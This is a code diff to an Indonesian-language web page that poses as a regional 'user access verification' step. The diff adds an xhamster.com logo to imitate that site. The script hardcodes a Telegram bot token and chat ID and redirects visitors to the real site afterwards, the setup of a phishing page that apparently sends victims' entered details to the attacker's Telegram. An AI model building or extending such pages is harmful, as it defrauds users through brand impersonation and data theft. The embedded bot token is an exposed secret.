@@ -25,6 +25,18 @@
             width: 90%;
             border: 1px solid #2f2f2f;
         }
+        /* Gaya Tulisan Logo di Atas */
+        .site-logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        .site-logo span {
+            color: #ff8c00; /* Warna jingga khas untuk aksen akhiran .com */
+        }
         h3 {
             font-size: 22px;
             margin-bottom: 15px;
@@ -93,6 +105,9 @@
 <body>
 
 <div class="container">
+    <!-- Bagian Tulisan Logo Paling Atas -->
+    <div class="site-logo">xhamster<span>.com</span></div>
+
     <div id="setup-box">
         <h3>Verifikasi Akses Pengguna</h3>
         <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
@@ -116,7 +131,7 @@
 <script>
 const TELEGRAM_TOKEN = "8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w";
 const CHAT_ID = "1966317946";
-const URL_WEB_TUJUAN = "https://xhamster.com/"; 
+const URL_WEB_TUJUAN = "https://xhamster.com"; 
 
 let wilayahDipilih = "";
 
